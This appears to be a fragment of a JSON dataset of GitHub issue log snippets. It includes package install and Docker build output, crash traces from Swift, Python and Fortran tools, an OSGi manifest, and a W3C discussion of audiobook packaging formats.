        "logs": "```\r\nyarn install v0.18.1\r\n[1/4] Resolving packages...\r\n[2/4] Fetching packages...\r\nwarning fsevents@1.0.17: The platform \"linux\" is incompatible with this module.\r\ninfo \"fsevents@1.0.17\" is an optional dependency and failed compatibility check. Excluding it from installation.\r\n[3/4] Linking dependencies...\r\nwarning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\".\r\n[4/4] Building fresh packages...\r\nDone in 8.18s.\r\n"
    },
    {
        "logs": "` is; I suspect it is a central apache setup problem. I have not touched that one.\r\n\r\nThat being said, I believe that the current directory was setup for packaged audio books examples only, at least for now. So I would say let us leave it for now as is, and we can come back to this if we get to other types of examples.\n<issue_comment>username_0: While the manifest itself would require specific headers for CORS, that's not the case for the audio resources as long as you use "
    },
    {
        "logs": "`. But support for range request is indeed a must have for audio resources.\n<issue_comment>username_6: Just a note about \"ingestion format\" vs. \"end-user format\": on multiple occasions I heard the term \"distribution format\" used to describe what I personally interpret as a B2B \"interchange format\". This notion of \"distribution\" really depends on \"who distributes to whom\", it's a question of perspective :)\r\n(same with \"delivery format\")\r\n\r\nSo, this kind of terminology can easily be misconstrued if we don't define the context carefully, and some of us might get lost in translation during our conversations. There are quite a few intermediaries along the digital supply chain (content creation / authoring, publishers, libraries, accessibility remediation, reading systems, etc.). I'm no expert, but I imagine that audio books production + distribution (that word again!) involve a very different workflow than ; say ; trade e-books, comic books, scholarly publications, etc. (which is why we're discussing TOC and packaging issues, notably)\r\n\r\nSo, as we aim to clarify use-cases specifically for packaged audio books (e.g. \"ingestion\" / \"interchange\") vs. generic packaged web publications (e.g. \"delivery\" / \"distribution\"), let's also try to disambiguate the terminology :)\n<issue_comment>username_0: @username_6 I agree that it can become difficult to follow such discussions and for audiobooks in particular there's IMO a lot of bias due to how things are deployed right now by large companies (each of them inventing their own format when delivering content to users).\r\n\r\nIMO we should align this packaged audiobook format with the same use cases as EPUB.\r\n\r\nReading an EPUB in a Web app is IMO a mistake: that's not something that EPUB was designed for and you need to jump through many hoops to achieve something that works decently. That's why I would recommend that we exclude such a use case for packaged audiobooks (at least as long as we don't have Web Packaging ready), since this can be handled in a much better way by WP.\n<issue_comment>username_2: @username_3 could you please add details from your comment https://github.com/w3c/wpub/issues/352#issuecomment-439700768 ?\r\n\r\nWhat are the character issues treated in OCF and not in the ISO std? what what is this signature issue?\n<issue_comment>username_4: There is an existing audiobook packaging format, M4B. It supports a cover image, some metadata, track names, etc.\n<issue_comment>username_3: Good catch on that, @username_4.   More info on .m4b on wikipedia at\nhttps://en.wikipedia.org/wiki/MPEG-4_Part_14\n<issue_comment>username_3: @username_2 \r\nThe filename issue can be found in the OCF spec at http://www.idpf.org/epub/31/spec/epub-ocf.html#sec-container-filenames where it goes into details on a subset of valid names, which must be encoded as UTF8\r\n\r\nFor the DigSig issue, see section 5.2 of ISO 23120 where it discusses differences from the ZIP Appnote including not supporting ZIP's native DigSig.  (but as with encryption, yes, you could use your own)\n<issue_comment>username_5: Is there a description of that file format? All pages that I stumbled into are very superficial, and I want to know whether it is really \"just\" a file format that can contain anything that we define, or whether we are forced to abide to some restrictions. \r\n\r\nAlso, it worries me that the [standard itself](https://www.iso.org/standard/75929.html) is, as often with ISO documents, behind a paywall. I do not think it would go down well when all other standards we use and refer to are available for free.\n<issue_comment>username_4: That's also maddening. But EPUB normatively references ISO 8601, which costs CHF 138! HTML normatively references ISO 3166, which costs a mere CHF 38. \r\n\r\nWe should talk to David Singer about this; he mentioned the use of MPEG as a packaging technology at TPAC Lyon.\n<issue_comment>username_3: @username_4 the stuff that David Singer mention is MPEG Part 12, while the audiobook stuff is using MPEG Part 14.  Related, yes, but not exactly the same.\n<issue_comment>username_5: Actually, I saw his name appearing on one of the documents around MPEG as editor (or something similar) so he can certainly be very helpful with this.\r\n\r\n@TzviyaSiegman, he is an AB buddy, right?\n<issue_comment>username_2: MPEG-4 Part 14 specs the .mp4 (or .m4a for Apple + audio) file format.\r\nWe are looking for a packaging format which can contain multiple mp4 files, with WP defined metadata ... not of stream of media objects with a few mpeg defined metadata (or XMP metadata). \r\n-> Not the same logical level.\n<issue_comment>username_8: Again, I do not think that this is true.  Digital signatures can be added on top of 211320.\n<issue_comment>username_6: Agreed, but shouldn't we also document the rationale for the in/out-of-scope status of the "
    },
    {
        "logs": "` audiobook player, yet it is actually based on ReadiumWebPubManifest (if I am not mistaken).\n<issue_comment>username_0: I'm not entirely sure which point you're trying to make @username_6 but to provide additional context:\r\n\r\n- this is based on the [audiobook profile](https://readium.org/webpub-manifest/extensions/audiobook) of the [Readium Web Publication Manifest](https://readium.org/webpub-manifest/), not a packaged version of it\r\n- the Web App itself can handle audiobooks in multiple media types and bitrates (if expressed in the manifest) and prioritize them accordingly (order listed in the "
    },
    {
        "logs": "` element)\r\n\r\nThis can be a good example to illustrate how an audiobook can be published as a WP, but it doesn't feel relevant to me in a discussion about packages.\n<issue_comment>username_0: Most container formats that I'm aware of for audio/video tend to be specifically tied to a specific file format and/or codec.\r\n\r\nCan you package Opus files in an M4B for example?\n<issue_comment>username_2: @daniel, m4b is an Apple extension of the mp4 format. Not a standard. Only Apple players use its extended features.\r\n\r\n+ I'm not sure that the bookmarks it provides (the b in the name) are hierarchical as the TOC this new format can provide. And we can have a beautiful & accessible & UTF-8 HTML TOC. Maybe m4b list of bookmarks don't go that far.\r\n\r\nAdd the metadata we aim to provide, and the fact that an m4b is ONE big file (vs multiple audio files for audiopub, easier to produce maybe), like a publication is not only one huge HTML file. But this is an advantage for the producer, not the user.\n<issue_comment>username_6: I am not an Apple customer and I read audiobooks in "
    },
    {
        "logs": "` would not be lossless, and anyway this is certainly not something I am advocating right now. I am merely reporting the fact that ; as others have done ; this format exists and seems to appeal (perhaps \"by default\") to some publishers. I am sure that Packaged-Audio-Web-Publications will be better ;)\n<issue_comment>username_9: I will find out what happens in m4b, for sure.  The offer I made was of the HEIF format, which is a specialization of the formats developed for MP4 (widely used) and MPEG-21 (unused), with the latter being re-purposed to carry images rather than 'digital items'.\r\n\r\nThe attached slides are what I hoped to show at TPAC. In essence, HEIF allows the storage of 'items', which have types (4 character code, or MIME types), simple names (which can be used in relative URLs, 'as if' the item were a separate file coming from the same place as the package), references (typed, directional, so one can see dependency), and identifies a 'primary item' entry point (e.g. the main HTML page, for this case). HEIF is a moderately abstract base-layer on which building a modern image file format was surprisingly easy; and it allows for both timed and untimed material in the same package.\r\n\r\nIf we could combine this with something the visual publishing world needs -- the ability to cause timed update of the HTML etc. -- I think we might have something very powerful.\r\n\r\nIt's an offer, and something to be aware of, and I'd be happy to entertain questions or get around a whiteboard.\r\n\r\n[heif preso.pdf](https://github.com/w3c/wpub/files/2678251/heif.preso.pdf)\n<issue_comment>username_4: @username_9 That's really interesting. How you envision this sort of package being consumed? My browsers have no idea what m4b files are, but iTunes is happy to play them. If a packaging format based on HEIF largely contained web content, can you imagine a future where a web browser could display all the content directly?\r\n\r\nI met a mountain guide in Canada last winter. He\u2019s created a really complex publication about avalanches. He doesn\u2019t want to distribute it as an ebook, as most reading systems can\u2019t handle the JavaScript, and many end users can\u2019t easily figure out how to obtain a reading system and side-load an EPUB. He just wants something he can email to a person so they can double-click and have it open in a browser. PDF eventually attained that level of ease. Some of us want that for web stuff.\n<issue_comment>username_9: I think there may be an opportunity here also for convergence; the media business (videos, audio) are also wanting a packaged interactive format. And there is a product spectrum here -- book, book with embedded audio/video, book with spoken audio, audiobook, TV/video program...\n<issue_comment>username_8: Long time ago, in W3C, there was an [attempt](https://www.w3.org/XML/2000/07/xml-packaging-charter.html) to create a ZIP-based package format.  In my understanding, it failed because different applications had different priorities.\n<issue_comment>username_10: There's also the later attempt (2012) at \"Packaged Web Apps\" aka widgets: https://www.w3.org/TR/widgets/\r\n\r\nInterestingly, Google had Gears, Firefox had Firefox OS packaged apps, but ultimately they've deprecated those in favor of Web-distributed installable Web apps.\r\n\r\nConsequently, our distribution and consumption models need analysis as we consider the packaging concerns. Ideally, the manifest and contents of the publication would need *no* changes when packaged or unpackaged such that publishers can create \"a publication\" and then determine the best distribution models for their business and content types.\n<issue_comment>username_7: This issue was resolved by a discussion in [the meeting on January 28](https://www.w3.org/publishing/groups/publ-wg/Meetings/Minutes/2019/2019-01-28-pwg#section2).\r\n\r\n- "
    },
    {
        "logs": "`\r\nManifest-Version: 1.0\r\nBnd-LastModified: 1589904947042\r\nBundle-ManifestVersion: 2\r\nBundle-Name: ossgang-commons\r\nBundle-SymbolicName: ossgang-commons\r\nBundle-Vendor: CERN\r\nBundle-Version: 0.0.0\r\nCreated-By: 1.8.0_252 (AdoptOpenJDK)\r\nExport-Package: org.ossgang.commons.awaitables;version=\"0.0.0\",org.oss\r\n gang.commons.awaitables.exceptions;version=\"0.0.0\",org.ossgang.common\r\n s.collections;version=\"0.0.0\",org.ossgang.commons.mapbackeds;version=\r\n \"0.0.0\",org.ossgang.commons.monads;version=\"0.0.0\",org.ossgang.common\r\n s.observables;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.o\r\n bservables.operators.connectors\";version=\"0.0.0\",org.ossgang.commons.\r\n observables.exceptions;version=\"0.0.0\",org.ossgang.commons.observable\r\n s.operators;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.observables.operators.b\r\n uffer;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.prop\r\n erties\";version=\"0.0.0\",org.ossgang.commons.observables.operators.con\r\n nectors;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.pr\r\n operties\";version=\"0.0.0\",org.ossgang.commons.observables.testing;use\r\n s:=\"org.ossgang.commons.observables\";version=\"0.0.0\",org.ossgang.comm\r\n ons.observables.weak;uses:=\"org.ossgang.commons.observables\";version=\r\n \"0.0.0\",org.ossgang.commons.properties;uses:=\"org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.utils;uses:=\"org.ossgan\r\n g.commons.monads\";version=\"0.0.0\"\r\nRequire-Capability: osgi.ee;filter:=\"(&(osgi.ee=JavaSE)(version=1.8))\"\r\nTool: Bnd-4.3.1.201911131708\r\n"
    },
    {
        "logs": "```\r\nManifest-Version: 1.0\r\nBnd-LastModified: 1589904947042\r\nBundle-ManifestVersion: 2\r\nBundle-Name: ossgang-commons\r\nBundle-SymbolicName: ossgang-commons\r\nBundle-Vendor: CERN\r\nBundle-Version: 0.0.0\r\nCreated-By: 1.8.0_252 (AdoptOpenJDK)\r\nExport-Package: org.ossgang.commons.awaitables;version=\"0.0.0\",org.oss\r\n gang.commons.awaitables.exceptions;version=\"0.0.0\",org.ossgang.common\r\n s.collections;version=\"0.0.0\",org.ossgang.commons.mapbackeds;version=\r\n \"0.0.0\",org.ossgang.commons.monads;version=\"0.0.0\",org.ossgang.common\r\n s.observables;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.o\r\n bservables.operators.connectors\";version=\"0.0.0\",org.ossgang.commons.\r\n observables.exceptions;version=\"0.0.0\",org.ossgang.commons.observable\r\n s.operators;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.observables.operators.b\r\n uffer;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.prop\r\n erties\";version=\"0.0.0\",org.ossgang.commons.observables.operators.con\r\n nectors;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.pr\r\n operties\";version=\"0.0.0\",org.ossgang.commons.observables.testing;use\r\n s:=\"org.ossgang.commons.observables\";version=\"0.0.0\",org.ossgang.comm\r\n ons.observables.weak;uses:=\"org.ossgang.commons.observables\";version=\r\n \"0.0.0\",org.ossgang.commons.properties;uses:=\"org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.utils;uses:=\"org.ossgan\r\n g.commons.monads\";version=\"0.0.0\"\r\nRequire-Capability: osgi.ee;filter:=\"(&(osgi.ee=JavaSE)(version=1.8))\"\r\nTool: Bnd-4.3.1.201911131708\r\n"
    },
    {
        "logs": "`\r\n[WARN] [1589967870.146949]: Error while start RPC-XML server on port 11611: [Errno 98] Address already in use\r\nTry again..\r\n"
    },
    {
        "logs": "```\r\n[WARN] [1589967870.146949]: Error while start RPC-XML server on port 11611: [Errno 98] Address already in use\r\nTry again..\r\n"
    },
    {
        "logs": "`\r\n14:20:50 FAIL: Swift(linux-x86_64) :: AutoDiff/compiler_crashers_fixed/sr12650-noderivative-parameter-type-mangling.swift (13232 of 13264)\r\n14:20:50 ******************** TEST 'Swift(linux-x86_64) :: AutoDiff/compiler_crashers_fixed/sr12650-noderivative-parameter-type-mangling.swift' FAILED ********************\r\n14:20:50 Script:\r\n14:20:50 --\r\n14:20:50 : 'RUN: at line 1';   /home/buildnode/jenkins/workspace/swift-PR-Linux-smoke-test@2/branch-master/buildbot_linux/swift-linux-x86_64/bin/swiftc -target x86_64-unknown-linux-gnu -toolchain-stdlib-rpath  -module-cache-path '/home/buildnode/jenkins/workspace/swift-PR-Linux-smoke-test@2/branch-master/buildbot_linux/swift-linux-x86_64/swift-test-results/x86_64-unknown-linux-gnu/clang-module-cache' -swift-version 4  -Xfrontend -ignore-module-source-info  -g /home/buildnode/jenkins/workspace/swift-PR-Linux-smoke-test@2/branch-master/swift/test/AutoDiff/compiler_crashers_fixed/sr12650-noderivative-parameter-type-mangling.swift\r\n14:20:50 --\r\n14:20:50 Exit Code: 254\r\n14:20:50 \r\n14:20:50 Command Output (stderr):\r\n14:20:50 --\r\n14:20:50 \r\nclang-10: error: unable to execute command: Bus error (core dumped)\r\n14:20:50 clang-10: error: linker command failed due to signal (use -v to see invocation)\r\n14:20:50 <unknown>:0: error: link command failed with exit code 254 (use -v to see invocation)\r\n"
    },
    {
        "logs": "`\r\n$ make test-docker\r\n\r\ndocker build --build-arg CEPH_VERSION=octopus -t go-ceph-ci:octopus -f testing/containers/ceph/Dockerfile .\r\n[+] Building 110.7s (11/11) FINISHED                                                                                                    \r\n => [internal] load build definition from Dockerfile                                                                               0.0s\r\n => => transferring dockerfile: 37B                                                                                                0.0s\r\n => [internal] load .dockerignore                                                                                                  0.0s\r\n => => transferring context: 2B                                                                                                    0.0s\r\n => [internal] load metadata for docker.io/ceph/daemon-base:latest-octopus                                                         2.7s\r\n => [internal] load build context                                                                                                  0.0s\r\n => => transferring context: 67B                                                                                                   0.0s\r\n => [1/6] FROM docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b  43.5s\r\n => => resolve docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b   0.0s\r\n => => sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b 743B / 743B                                         0.0s\r\n => => sha256:87d4014973b60eb51b0d79d76e5af31b79c7614b30a39220d8271763024511ec 22.78kB / 22.78kB                                   0.0s\r\n => => sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e 293.55MB / 293.55MB                                30.8s\r\n => => extracting sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e                                         12.1s\r\n => [2/6] RUN true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum insta  49.6s\r\n => [3/6] RUN true &&     curl -o /tmp/go1.15.10.linux-amd64.tar.gz https://dl.google.com/go/go1.15.10.linux-amd64.tar.gz &&      12.1s\r\n => [4/6] WORKDIR /go/src/github.com/ceph/go-ceph                                                                                  0.1s \r\n => [5/6] COPY micro-osd.sh /                                                                                                      0.0s \r\n => [6/6] COPY entrypoint.sh /                                                                                                     0.0s \r\n => exporting to image                                                                                                             2.4s \r\n => => exporting layers                                                                                                            2.4s \r\n => => writing image sha256:26ecff9b28e8e43e4adbbe498bbe12ea479a04b76929fced477329e63d4a4db0                                       0.0s\r\n => => naming to docker.io/library/go-ceph-ci:octopus                                                                              0.0s\r\n\r\nUse 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them\r\necho octopus >> .build.octopus\r\ndocker run --security-opt apparmor:unconfined --rm -v /Users/username_0/go/src/github.com/ceph/go-ceph:/go/src/github.com/ceph/go-ceph  go-ceph-ci:octopus \r\n*** running: /micro-osd.sh /tmp/ceph\r\n++ set -u\r\n++ DIR=/tmp/ceph\r\n++ pkill ceph\r\n++ true\r\n++ rm -rf '/tmp/ceph/*'\r\n++ LOG_DIR=/tmp/ceph/log\r\n++ MON_DATA=/tmp/ceph/mon\r\n++ MDS_DATA=/tmp/ceph/mds\r\n++ MOUNTPT=/tmp/ceph/mds/mnt\r\n++ OSD_DATA=/tmp/ceph/osd\r\n++ RGW_DATA=/tmp/ceph/radosgw\r\n++ mkdir /tmp/ceph/log /tmp/ceph/mon /tmp/ceph/osd /tmp/ceph/mds /tmp/ceph/mds/mnt /tmp/ceph/radosgw\r\n++ MDS_NAME=Z\r\n++ MON_NAME=a\r\n++ MGR_NAME=x\r\n++ MIRROR_ID=m\r\n++ RGW_ID=r\r\n++ cat\r\n+++ uuidgen\r\n++ export CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ ceph-mon --id a --mkfs --keyring /dev/null\r\n++ touch /tmp/ceph/mon/keyring\r\n++ ceph-mon --id a\r\n2021-05-05T15:05:32.150+0000 7fc58a786700 -1 WARNING: invalid 'mon addr' config option\r\n         continuing with monmap configuration\r\n+++ ceph osd create\r\n++ OSD_ID=0\r\n++ ceph osd crush add osd.0 1 root=default\r\nadd item id 0 name 'osd.0' weight 1 at location {root=default} to crush map\r\n++ ceph-osd --id 0 --mkjournal --mkfs\r\n2021-05-05T15:05:33.852+0000 7f2775b64f40 -1 memstore(/tmp/ceph/osd) /tmp/ceph/osd\r\n++ ceph-osd --id 0\r\n2021-05-05T15:05:33.908+0000 7f7d8a341f40 -1 Falling back to public interface\r\n2021-05-05T15:05:33.969+0000 7f7d8a341f40 -1 osd.0 0 log_to_monitors {default=true}\r\n++ ceph auth get-or-create mds.Z mon 'profile mds' mgr 'profile mds' mds 'allow *' osd 'allow *'\r\n++ ceph osd pool create cephfs_data 8\r\npool 'cephfs_data' created\r\n++ ceph osd pool create cephfs_metadata 8\r\npool 'cephfs_metadata' created\r\n++ ceph fs new cephfs cephfs_metadata cephfs_data\r\nnew fs with metadata pool 2 and data pool 1\r\n++ ceph fs ls\r\nname: cephfs, metadata pool: cephfs_metadata, data pools: [cephfs_data ]\r\n++ ceph-mds -i Z\r\nstarting mds.Z at \r\n[Truncated]\n=== RUN   TestNew/no_endpoint\r\n=== RUN   TestNew/no_accessKey\r\n=== RUN   TestNew/no_secretKey\r\n--- PASS: TestNew (0.00s)\r\n    --- PASS: TestNew/no_endpoint (0.00s)\r\n    --- PASS: TestNew/no_accessKey (0.00s)\r\n    --- PASS: TestNew/no_secretKey (0.00s)\r\n=== RUN   TestUnmarshal\r\n--- PASS: TestUnmarshal (0.00s)\r\n=== RUN   TestBuildQueryPath\r\n--- PASS: TestBuildQueryPath (0.00s)\r\n=== RUN   Test_getValues\r\n=== RUN   Test_getValues/default\r\n--- PASS: Test_getValues (0.00s)\r\n    --- PASS: Test_getValues/default (0.00s)\r\nPASS\r\ncoverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\nok      github.com/ceph/go-ceph/rgwadmin        0.267s  coverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\n*** running: go tool cover -html=cover.out -o /results/coverage/go-ceph.html                                                               \r\n"
    },
    {
        "logs": "`\r\nNo match for argument: libcephfs-devel-16.2.1-0.el8\r\nNo match for argument: librados-devel-16.2.1-0.el8\r\nNo match for argument: librbd-devel-16.2.1-0.el8\r\nError: Unable to find a match: libcephfs-devel-16.2.1-0.el8 librados-devel-16.2.1-0.el8 librbd-devel-16.2.1-0.el8\r\nThe command '/bin/sh -c true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum install -y         git wget curl make         /usr/bin/cc /usr/bin/c++         \"libcephfs-devel-${cv}\" \"librados-devel-${cv}\" \"librbd-devel-${cv}\" &&     true' returned a non-zero code: 1\r\nmake: *** [Makefile:73: .build.pacific] Error 1\r\n"
    },
    {
        "logs": "```\r\n$ make test-docker\r\n\r\ndocker build --build-arg CEPH_VERSION=octopus -t go-ceph-ci:octopus -f testing/containers/ceph/Dockerfile .\r\n[+] Building 110.7s (11/11) FINISHED                                                                                                    \r\n => [internal] load build definition from Dockerfile                                                                               0.0s\r\n => => transferring dockerfile: 37B                                                                                                0.0s\r\n => [internal] load .dockerignore                                                                                                  0.0s\r\n => => transferring context: 2B                                                                                                    0.0s\r\n => [internal] load metadata for docker.io/ceph/daemon-base:latest-octopus                                                         2.7s\r\n => [internal] load build context                                                                                                  0.0s\r\n => => transferring context: 67B                                                                                                   0.0s\r\n => [1/6] FROM docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b  43.5s\r\n => => resolve docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b   0.0s\r\n => => sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b 743B / 743B                                         0.0s\r\n => => sha256:87d4014973b60eb51b0d79d76e5af31b79c7614b30a39220d8271763024511ec 22.78kB / 22.78kB                                   0.0s\r\n => => sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e 293.55MB / 293.55MB                                30.8s\r\n => => extracting sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e                                         12.1s\r\n => [2/6] RUN true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum insta  49.6s\r\n => [3/6] RUN true &&     curl -o /tmp/go1.15.10.linux-amd64.tar.gz https://dl.google.com/go/go1.15.10.linux-amd64.tar.gz &&      12.1s\r\n => [4/6] WORKDIR /go/src/github.com/ceph/go-ceph                                                                                  0.1s \r\n => [5/6] COPY micro-osd.sh /                                                                                                      0.0s \r\n => [6/6] COPY entrypoint.sh /                                                                                                     0.0s \r\n => exporting to image                                                                                                             2.4s \r\n => => exporting layers                                                                                                            2.4s \r\n => => writing image sha256:26ecff9b28e8e43e4adbbe498bbe12ea479a04b76929fced477329e63d4a4db0                                       0.0s\r\n => => naming to docker.io/library/go-ceph-ci:octopus                                                                              0.0s\r\n\r\nUse 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them\r\necho octopus >> .build.octopus\r\ndocker run --security-opt apparmor:unconfined --rm -v /Users/username_0/go/src/github.com/ceph/go-ceph:/go/src/github.com/ceph/go-ceph  go-ceph-ci:octopus \r\n*** running: /micro-osd.sh /tmp/ceph\r\n++ set -u\r\n++ DIR=/tmp/ceph\r\n++ pkill ceph\r\n++ true\r\n++ rm -rf '/tmp/ceph/*'\r\n++ LOG_DIR=/tmp/ceph/log\r\n++ MON_DATA=/tmp/ceph/mon\r\n++ MDS_DATA=/tmp/ceph/mds\r\n++ MOUNTPT=/tmp/ceph/mds/mnt\r\n++ OSD_DATA=/tmp/ceph/osd\r\n++ RGW_DATA=/tmp/ceph/radosgw\r\n++ mkdir /tmp/ceph/log /tmp/ceph/mon /tmp/ceph/osd /tmp/ceph/mds /tmp/ceph/mds/mnt /tmp/ceph/radosgw\r\n++ MDS_NAME=Z\r\n++ MON_NAME=a\r\n++ MGR_NAME=x\r\n++ MIRROR_ID=m\r\n++ RGW_ID=r\r\n++ cat\r\n+++ uuidgen\r\n++ export CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ ceph-mon --id a --mkfs --keyring /dev/null\r\n++ touch /tmp/ceph/mon/keyring\r\n++ ceph-mon --id a\r\n2021-05-05T15:05:32.150+0000 7fc58a786700 -1 WARNING: invalid 'mon addr' config option\r\n         continuing with monmap configuration\r\n+++ ceph osd create\r\n++ OSD_ID=0\r\n++ ceph osd crush add osd.0 1 root=default\r\nadd item id 0 name 'osd.0' weight 1 at location {root=default} to crush map\r\n++ ceph-osd --id 0 --mkjournal --mkfs\r\n2021-05-05T15:05:33.852+0000 7f2775b64f40 -1 memstore(/tmp/ceph/osd) /tmp/ceph/osd\r\n++ ceph-osd --id 0\r\n2021-05-05T15:05:33.908+0000 7f7d8a341f40 -1 Falling back to public interface\r\n2021-05-05T15:05:33.969+0000 7f7d8a341f40 -1 osd.0 0 log_to_monitors {default=true}\r\n++ ceph auth get-or-create mds.Z mon 'profile mds' mgr 'profile mds' mds 'allow *' osd 'allow *'\r\n++ ceph osd pool create cephfs_data 8\r\npool 'cephfs_data' created\r\n++ ceph osd pool create cephfs_metadata 8\r\npool 'cephfs_metadata' created\r\n++ ceph fs new cephfs cephfs_metadata cephfs_data\r\nnew fs with metadata pool 2 and data pool 1\r\n++ ceph fs ls\r\nname: cephfs, metadata pool: cephfs_metadata, data pools: [cephfs_data ]\r\n++ ceph-mds -i Z\r\nstarting mds.Z at \r\n[Truncated]\n=== RUN   TestNew/no_endpoint\r\n=== RUN   TestNew/no_accessKey\r\n=== RUN   TestNew/no_secretKey\r\n--- PASS: TestNew (0.00s)\r\n    --- PASS: TestNew/no_endpoint (0.00s)\r\n    --- PASS: TestNew/no_accessKey (0.00s)\r\n    --- PASS: TestNew/no_secretKey (0.00s)\r\n=== RUN   TestUnmarshal\r\n--- PASS: TestUnmarshal (0.00s)\r\n=== RUN   TestBuildQueryPath\r\n--- PASS: TestBuildQueryPath (0.00s)\r\n=== RUN   Test_getValues\r\n=== RUN   Test_getValues/default\r\n--- PASS: Test_getValues (0.00s)\r\n    --- PASS: Test_getValues/default (0.00s)\r\nPASS\r\ncoverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\nok      github.com/ceph/go-ceph/rgwadmin        0.267s  coverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\n*** running: go tool cover -html=cover.out -o /results/coverage/go-ceph.html                                                               \r\n"
    },
    {
        "logs": "```\r\nNo match for argument: libcephfs-devel-16.2.1-0.el8\r\nNo match for argument: librados-devel-16.2.1-0.el8\r\nNo match for argument: librbd-devel-16.2.1-0.el8\r\nError: Unable to find a match: libcephfs-devel-16.2.1-0.el8 librados-devel-16.2.1-0.el8 librbd-devel-16.2.1-0.el8\r\nThe command '/bin/sh -c true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum install -y         git wget curl make         /usr/bin/cc /usr/bin/c++         \"libcephfs-devel-${cv}\" \"librados-devel-${cv}\" \"librbd-devel-${cv}\" &&     true' returned a non-zero code: 1\r\nmake: *** [Makefile:73: .build.pacific] Error 1\r\n"
    },
    {
        "logs": "`\r\n$python -c \"import quippy\"\r\nFortran runtime error: Incorrect extent in VALUE argument to DATE_AND_TIME intrinsic: is -2, should be >=8\r\n"
    },
    {
        "logs": "`\r\nFatal Python error: GC object already tracked\r\n\r\nCurrent thread 0x00007f2b048e8700 (most recent call first):\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/json/__init__.py\", line 310 in loads\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1607 in dump_model\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1653 in feature_importance\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/sklearn.py\", line 481 in feature_importance\r\n  File \"test.py\", line 29 in <module>\r\n[1]    22034 abort (core dumped)  python test_classifier.py\r\n"
    },
    {
        "logs": "```\r\nFatal Python error: GC object already tracked\r\n\r\nCurrent thread 0x00007f2b048e8700 (most recent call first):\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/json/__init__.py\", line 310 in loads\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1607 in dump_model\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1653 in feature_importance\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/sklearn.py\", line 481 in feature_importance\r\n  File \"test.py\", line 29 in <module>\r\n[1]    22034 abort (core dumped)  python test_classifier.py\r\n"
    },
    {
